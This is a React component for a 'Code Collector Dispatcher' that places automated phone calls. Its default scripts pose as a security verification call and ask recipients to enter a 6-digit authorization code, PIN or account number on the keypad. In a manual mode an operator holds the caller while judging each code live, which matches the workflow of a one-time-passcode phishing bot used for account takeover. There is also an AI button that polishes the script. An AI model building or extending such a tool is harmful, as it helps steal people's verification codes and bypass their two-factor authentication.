import React, { useEffect, useRef, useState } from 'react';
import {
  Phone,
  Play,
  Volume2,
  CheckCircle,
  AlertCircle,
  Loader2,
  KeyRound,
  Sparkles,
  RefreshCw,
  MessageSquare,
  ShieldCheck,
  AlertTriangle,
  RotateCcw,
  SlidersHorizontal,
  UserCheck,
  Cpu,
  PauseCircle,
} from 'lucide-react';
import { VOICE_PROFILES } from '../utils/constants';
import { cleanDigits, formatUsPhoneDisplay, validateUsPhoneNumber } from '../utils/phoneFormat';
import { TwilioConfig } from '../types/telephony';

const PROMPTS_STORAGE_KEY = 'voicedrop_dispatcher_prompts';
const DEFAULT_PROMPTS = {
  holdMessage: 'Kindly hold while your information is being processed.',
  introGreeting: 'Hello, thank you for answering. This is an automated security verification call.',
  script: 'Please enter your 6-digit authorization code on your phone keypad now, followed by the pound sign.',
  invalidMessage: 'That code is incorrect. Please re-enter your 6-digit code on your keypad now, followed by the pound sign.',
  successMessage: 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
};

const loadSavedPrompts = () => {
  try {
    const saved = localStorage.getItem(PROMPTS_STORAGE_KEY);
    return saved ? { ...DEFAULT_PROMPTS, ...JSON.parse(saved) } : DEFAULT_PROMPTS;
  } catch {
    return DEFAULT_PROMPTS;
  }
};

interface ControlCenterProps {
  onLaunchCall: (params: {
    to: string;
    introGreeting: string;
    message: string;
    verificationMode?: 'manual' | 'auto';
    holdMessage?: string;
    expectedCode?: string;
    invalidMessage?: string;
    successMessage?: string;
    maxAttempts?: number;
    voice: string;
    inputMode: 'dtmf' | 'speech' | 'dtmf speech';
    numDigits: number;
    keypadActions: Record<string, string>;
  }) => Promise<void>;
  isLoading: boolean;
  activeCall: boolean;
  mode: 'live' | 'simulator';
  hasGemini: boolean;
  twilioConfig: TwilioConfig | null;
}

export const ControlCenter: React.FC<ControlCenterProps> = ({
  onLaunchCall,
  isLoading,
  activeCall,
  mode,
  hasGemini,
}) => {
  const [rawPhone, setRawPhone] = useState('(555) 382-9104');
  const phoneInputRef = useRef<HTMLInputElement>(null);
  const [numDigits, setNumDigits] = useState<number>(6);
  const [selectedVoice, setSelectedVoice] = useState('Polly.Joanna');
  const [isEnhancing, setIsEnhancing] = useState(false);

  // Verification mode: Manual operator review is default
  const [verificationMode, setVerificationMode] = useState<'manual' | 'auto'>('manual');

  // Spoken message while operator reviews code
  const [savedPrompts] = useState(loadSavedPrompts);
  const [holdMessage, setHoldMessage] = useState(savedPrompts.holdMessage);

  // 1. Immediate message played right when phone answers
  const [introGreeting, setIntroGreeting] = useState(savedPrompts.introGreeting);

  // 2. Expected valid code (used in auto mode)
  const [expectedCode, setExpectedCode] = useState('482910');

  // 3. Message requesting the code
  const [script, setScript] = useState(savedPrompts.script);

  // 4. Invalid code message (plays if code is incorrect so user can retry)
  const [invalidMessage, setInvalidMessage] = useState(savedPrompts.invalidMessage);

  // 5. Message after valid code is collected
  const [successMessage, setSuccessMessage] = useState(savedPrompts.successMessage);

  const [maxAttempts, setMaxAttempts] = useState(3);
  const [activeTab, setActiveTab] = useState<'main' | 'prompts'>('main');

  useEffect(() => {
    localStorage.setItem(PROMPTS_STORAGE_KEY, JSON.stringify({
      holdMessage,
      introGreeting,
      script,
      invalidMessage,
      successMessage,
    }));
  }, [holdMessage, introGreeting, script, invalidMessage, successMessage]);

  const phoneValidation = validateUsPhoneNumber(rawPhone);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const inputValue = e.target.value;
    const selectionStart = e.target.selectionStart ?? inputValue.length;
    let localDigitsBeforeCaret = cleanDigits(inputValue.slice(0, selectionStart)).length;
    if (inputValue.startsWith('+1')) {
      localDigitsBeforeCaret = Math.max(0, localDigitsBeforeCaret - 1);
    }

    const formatted = formatUsPhoneDisplay(inputValue);
    setRawPhone(formatted);

    requestAnimationFrame(() => {
      const input = phoneInputRef.current;
      if (!input) return;
      const digits = cleanDigits(formatted);
      const hasCountryPrefix = formatted.startsWith('+1');
      const localDigitCount = Math.max(0, digits.length - (hasCountryPrefix ? 1 : 0));
      const targetDigit = Math.min(localDigitsBeforeCaret, localDigitCount);
      let seenLocalDigits = 0;
      let caret = hasCountryPrefix ? 4 : 0;
      if (targetDigit > 0) {
        for (let i = hasCountryPrefix ? 4 : 0; i < formatted.length; i++) {
          if (/\d/.test(formatted[i])) {
            seenLocalDigits += 1;
            caret = i + 1;
            if (seenLocalDigits >= targetDigit) break;
          }
        }
      }
      input.setSelectionRange(caret, caret);
    });
  };

  const generateRandomCode = (len: number) => {
    let result = '';
    for (let i = 0; i < len; i++) {
      result += Math.floor(Math.random() * 10);
    }
    return result;
  };

  const handleDigitLengthChange = (digits: number) => {
    setNumDigits(digits);
    const newCode = generateRandomCode(digits);
    setExpectedCode(newCode);
  };

  const handleRandomizeCode = () => {
    setExpectedCode(generateRandomCode(numDigits));
  };

  const handleAiPolish = async () => {
    if (!hasGemini) return;
    try {
      setIsEnhancing(true);
      const res = await fetch('/api/ai/enhance-script', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          prompt: `${introGreeting}. ${script}`,
          useCase: `${numDigits}-digit code verification with manual review`,
        }),
      });
      const data = await res.json();
      if (data.script) setScript(data.script);
    } catch (err) {
      console.error(err);
    } finally {
      setIsEnhancing(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneValidation.isValid) return;

    onLaunchCall({
      to: phoneValidation.e164,
      introGreeting,
      message: script,
      verificationMode,
      holdMessage,
      expectedCode: verificationMode === 'auto' ? expectedCode.trim() : undefined,
      invalidMessage,
      successMessage,
      maxAttempts,
      voice: selectedVoice,
      inputMode: 'dtmf',
      numDigits,
      keypadActions: {
        code: `${numDigits}-Digit Code Collection`,
      },
    });
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 lg:p-6 shadow-sm">
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Header */}
        <div className="flex items-center justify-between pb-3 border-b border-slate-800">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-lg bg-indigo-500/10 border border-indigo-500/20 text-indigo-400">
              <KeyRound className="w-4 h-4" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-white tracking-tight">
                Code Collector Dispatcher
              </h2>
              <p className="text-xs text-slate-400">
                Live Operator Controls &bull; Interactive Voice Prompts
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <div className="text-[11px] font-medium px-2.5 py-0.5 rounded-md bg-slate-800 text-slate-300 border border-slate-700">
              {mode === 'simulator' ? 'Simulator' : 'Live Carrier'}
            </div>
          </div>
        </div>

        {/* Verification Authority Mode Selector */}
        <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
          <div className="flex items-center justify-between">
            <span className="text-xs font-semibold text-slate-200 flex items-center gap-1.5">
              <SlidersHorizontal className="w-3.5 h-3.5 text-indigo-400" />
              <span>Code Verification Mode</span>
            </span>
            <span className="text-[10px] uppercase font-bold text-indigo-400">
              {verificationMode === 'manual' ? 'Live Manual Authority' : 'Auto Preset Match'}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-2">
            <button
              type="button"
              onClick={() => setVerificationMode('manual')}
              className={`p-2.5 rounded-lg border text-left transition-all ${
                verificationMode === 'manual'
                  ? 'bg-indigo-600/20 border-indigo-500 text-white ring-1 ring-indigo-500/30'
                  : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-slate-200'
              }`}
            >
              <div className="flex items-center gap-1.5 font-bold text-xs text-indigo-300">
                <UserCheck className="w-3.5 h-3.5" />
                <span>Manual Operator (You)</span>
              </div>
              <p className="text-[10px] text-slate-400 mt-0.5 leading-snug">
                You decide live if code is valid or invalid. Caller waits on hold.
              </p>
            </button>

            <button
              type="button"
              onClick={() => setVerificationMode('auto')}
              className={`p-2.5 rounded-lg border text-left transition-all ${
                verificationMode === 'auto'
                  ? 'bg-indigo-600/20 border-indigo-500 text-white ring-1 ring-indigo-500/30'
                  : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-slate-200'
              }`}
            >
              <div className="flex items-center gap-1.5 font-bold text-xs text-slate-300">
                <Cpu className="w-3.5 h-3.5" />
                <span>Auto Match Preset</span>
              </div>
              <p className="text-[10px] text-slate-400 mt-0.5 leading-snug">
                System automatically checks code against preset code.
              </p>
            </button>
          </div>
        </div>

        {/* Sub-navigation tabs between Main Setup and Voice Messages */}
        <div className="flex items-center p-1 bg-slate-950 rounded-lg border border-slate-800 text-xs">
          <button
            type="button"
            onClick={() => setActiveTab('main')}
            className={`flex-1 py-1.5 px-3 rounded-md font-medium transition-all ${
              activeTab === 'main'
                ? 'bg-indigo-600 text-white shadow-sm'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Target &amp; Call Setup
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('prompts')}
            className={`flex-1 py-1.5 px-3 rounded-md font-medium transition-all flex items-center justify-center gap-1.5 ${
              activeTab === 'prompts'
                ? 'bg-indigo-600 text-white shadow-sm'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <MessageSquare className="w-3.5 h-3.5" />
            <span>Spoken Prompts &amp; Hold Audio</span>
          </button>
        </div>

        {activeTab === 'main' ? (
          <>
            {/* 1. Recipient Phone Number */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-1">
                Recipient Phone Number (US) <span className="text-rose-400">*</span>
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-sm">
                  🇺🇸
                </div>
                <input
                  ref={phoneInputRef}
                  type="text"
                  value={rawPhone}
                  onChange={handlePhoneChange}
                  placeholder="+1 (555) 000-0000"
                  className={`w-full pl-9 pr-24 py-2 bg-slate-950 border rounded-lg text-sm font-mono text-white placeholder-slate-600 focus:outline-none transition-all ${
                    phoneValidation.isValid
                      ? 'border-emerald-500/50 focus:border-emerald-400'
                      : rawPhone.length > 0
                      ? 'border-rose-500/50 focus:border-rose-400'
                      : 'border-slate-800 focus:border-indigo-500'
                  }`}
                />
                <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none text-xs">
                  {phoneValidation.isValid ? (
                    <span className="flex items-center gap-1 text-emerald-400 font-semibold font-mono text-[11px]">
                      <CheckCircle className="w-3.5 h-3.5" />
                      <span>Valid</span>
                    </span>
                  ) : rawPhone.length > 0 ? (
                    <span className="text-rose-400 text-[11px] font-medium flex items-center gap-1">
                      <AlertCircle className="w-3.5 h-3.5" />
                      <span>10 Digits</span>
                    </span>
                  ) : (
                    <Phone className="w-3.5 h-3.5 text-slate-600" />
                  )}
                </div>
              </div>
              {!phoneValidation.isValid && rawPhone.length > 0 && (
                <p className="text-[11px] text-rose-400 mt-1">{phoneValidation.error}</p>
              )}
            </div>

            {/* 2. Expected Digit Length Selection */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-1.5">
                Expected Code Length
              </label>

              <div className="grid grid-cols-3 gap-2">
                {[
                  { count: 4, label: '4 Digits', sub: 'PIN Code' },
                  { count: 5, label: '5 Digits', sub: 'Account/ZIP' },
                  { count: 6, label: '6 Digits', sub: 'OTP Security' },
                ].map(({ count, label, sub }) => (
                  <button
                    key={count}
                    type="button"
                    onClick={() => handleDigitLengthChange(count)}
                    className={`py-2 px-3 rounded-lg border text-left transition-all ${
                      numDigits === count
                        ? 'bg-indigo-600 text-white border-indigo-500 shadow-sm font-semibold'
                        : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700 hover:text-white'
                    }`}
                  >
                    <div className="text-sm font-bold font-mono">{label}</div>
                    <div className={`text-[10px] ${numDigits === count ? 'text-indigo-200' : 'text-slate-500'}`}>
                      {sub}
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* 3. Hold Message Spoken while Operator is Reviewing */}
            {verificationMode === 'manual' ? (
              <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-1.5">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-semibold text-slate-200 flex items-center gap-1.5">
                    <PauseCircle className="w-3.5 h-3.5 text-amber-400" />
                    <span>Hold Message while You Review</span>
                  </label>
                  <span className="text-[10px] text-slate-500 font-mono">Looping comfort message</span>
                </div>
                <input
                  type="text"
                  value={holdMessage}
                  onChange={(e) => setHoldMessage(e.target.value)}
                  className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-amber-200 focus:outline-none focus:border-amber-400"
                />
                <p className="text-[11px] text-slate-400 leading-tight">
                  Plays to caller right after code is entered while awaiting your [Approve] or [Reject] click.
                </p>
              </div>
            ) : (
              <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-semibold text-slate-200 flex items-center gap-1.5">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Preset Target Code</span>
                  </label>
                  <button
                    type="button"
                    onClick={handleRandomizeCode}
                    className="inline-flex items-center gap-1 text-[11px] text-indigo-400 hover:text-indigo-300 font-medium"
                  >
                    <RefreshCw className="w-3 h-3" />
                    <span>Randomize</span>
                  </button>
                </div>

                <div className="flex items-center gap-2">
                  <input
                    type="text"
                    maxLength={numDigits}
                    value={expectedCode}
                    onChange={(e) => setExpectedCode(e.target.value.replace(/\D/g, '').slice(0, numDigits))}
                    placeholder={`${numDigits} digits`}
                    className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-base font-mono font-bold tracking-widest text-emerald-400 focus:outline-none focus:border-emerald-500"
                  />
                  <span className="text-xs text-slate-400 font-mono shrink-0">
                    {expectedCode.length}/{numDigits} digits
                  </span>
                </div>
              </div>
            )}

            {/* 4. Immediate Pickup Message Preview */}
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-xs font-semibold text-slate-300">
                  Immediate Message on Pickup
                </label>
                <span className="text-[11px] text-slate-500">Plays when recipient answers</span>
              </div>
              <textarea
                rows={2}
                value={introGreeting}
                onChange={(e) => setIntroGreeting(e.target.value)}
                placeholder="Greeting spoken the instant the phone is answered..."
                className="w-full p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 placeholder-slate-600 focus:outline-none focus:border-indigo-500 leading-relaxed resize-none"
              />
            </div>

            {/* 5. Voice Engine Selection */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-1">
                Synthetic Voice Profile
              </label>
              <div className="relative">
                <select
                  value={selectedVoice}
                  onChange={(e) => setSelectedVoice(e.target.value)}
                  className="w-full py-1.5 px-3 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-indigo-500 appearance-none pr-8"
                >
                  {VOICE_PROFILES.map((v) => (
                    <option key={v.id} value={v.id} className="bg-slate-900 text-white">
                      {v.name} ({v.accent})
                    </option>
                  ))}
                </select>
                <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none text-slate-500">
                  <Volume2 className="w-3.5 h-3.5" />
                </div>
              </div>
            </div>
          </>
        ) : (
          /* PROMPTS & RETRY FLOW TAB */
          <div className="space-y-3.5">
            {/* Immediate Pickup Greeting */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-1">
                1. Message Spoken Immediately on Pickup
              </label>
              <textarea
                rows={2}
                value={introGreeting}
                onChange={(e) => setIntroGreeting(e.target.value)}
                className="w-full p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-indigo-500 resize-none"
              />
            </div>

            {/* Code Request Prompt */}
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-xs font-semibold text-slate-300">
                  2. Prompt Requesting {numDigits}-Digit Code
                </label>
                {hasGemini && (
                  <button
                    type="button"
                    onClick={handleAiPolish}
                    disabled={isEnhancing}
                    className="inline-flex items-center gap-1 text-[11px] text-indigo-400 hover:text-indigo-300 disabled:opacity-50"
                  >
                    {isEnhancing ? <Loader2 className="w-3 h-3 animate-spin" /> : <Sparkles className="w-3 h-3" />}
                    <span>AI Polish</span>
                  </button>
                )}
              </div>
              <textarea
                rows={2}
                value={script}
                onChange={(e) => setScript(e.target.value)}
                className="w-full p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-indigo-500 resize-none"
              />
            </div>

            {/* Hold Message */}
            <div>
              <label className="text-xs font-semibold text-amber-300 flex items-center gap-1.5 mb-1">
                <PauseCircle className="w-3.5 h-3.5 text-amber-400" />
                <span>3. Hold Message ("Kindly Hold / Please Wait")</span>
              </label>
              <textarea
                rows={2}
                value={holdMessage}
                onChange={(e) => setHoldMessage(e.target.value)}
                className="w-full p-2.5 bg-slate-950 border border-amber-900/40 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-amber-500 resize-none"
              />
            </div>

            {/* Invalid Code Message (Retry Loop) */}
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-xs font-semibold text-rose-300 flex items-center gap-1.5">
                  <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
                  <span>4. Invalid Code / Incorrect Password Message</span>
                </label>
                <span className="text-[10px] text-rose-400/80 font-mono">Spoken on reject or cue</span>
              </div>
              <textarea
                rows={2}
                value={invalidMessage}
                onChange={(e) => setInvalidMessage(e.target.value)}
                className="w-full p-2.5 bg-slate-950 border border-rose-900/40 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-rose-500 resize-none"
              />
            </div>

            {/* Confirmation Message */}
            <div>
              <label className="text-xs font-semibold text-emerald-300 flex items-center gap-1.5 mb-1">
                <CheckCircle className="w-3.5 h-3.5 text-emerald-400" />
                <span>5. Confirmation Message (Spoken Once Approved)</span>
              </label>
              <textarea
                rows={2}
                value={successMessage}
                onChange={(e) => setSuccessMessage(e.target.value)}
                className="w-full p-2.5 bg-slate-950 border border-emerald-900/40 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-emerald-500 resize-none"
              />
            </div>

            {/* Max Retry Limit */}
            <div className="flex items-center justify-between pt-1 text-xs text-slate-300">
              <span className="font-semibold flex items-center gap-1">
                <RotateCcw className="w-3.5 h-3.5 text-indigo-400" />
                <span>Max Allowed Incorrect Attempts:</span>
              </span>
              <select
                value={maxAttempts}
                onChange={(e) => setMaxAttempts(Number(e.target.value))}
                className="py-1 px-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 font-mono"
              >
                <option value={2}>2 attempts</option>
                <option value={3}>3 attempts</option>
                <option value={5}>5 attempts</option>
              </select>
            </div>
          </div>
        )}

        {/* Launch Outbound Call Action Button */}
        <div className="pt-2">
          <button
            type="submit"
            disabled={!phoneValidation.isValid || isLoading || activeCall}
            className={`w-full py-3 px-4 rounded-lg font-bold text-xs tracking-wider uppercase flex items-center justify-center gap-2 shadow-md transition-all select-none ${
              !phoneValidation.isValid || activeCall
                ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-slate-700'
                : 'bg-indigo-600 hover:bg-indigo-500 text-white cursor-pointer active:scale-[0.99]'
            }`}
          >
            {isLoading ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Placing Call...</span>
              </>
            ) : activeCall ? (
              <>
                <Phone className="w-4 h-4 animate-pulse" />
                <span>Call Active in Session...</span>
              </>
            ) : (
              <>
                <Play className="w-4 h-4 fill-current" />
                <span>Launch Call ({verificationMode === 'manual' ? 'Manual Operator' : 'Auto Match'})</span>
              </>
            )}
          </button>
        </div>
      </form>
    </div>
  );
};
